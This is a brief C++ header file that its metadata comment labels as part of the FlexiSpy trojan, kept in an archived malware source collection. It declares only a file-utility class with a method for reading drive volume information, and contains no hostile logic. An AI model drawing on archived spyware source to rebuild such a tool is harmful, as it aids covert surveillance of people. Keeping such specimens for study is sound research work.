/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#ifndef ___FileUtil_H_
#define ___FileUtil_H_

class TFileUtil
{
public:

	/*
	*  Get Drive's volume
	*
	* @param aVolume on return result
	* @param aDrive
	*/
	static void GetVolumeInfo(TVolumeInfo& aVolume, TInt aDrive);
}

#endif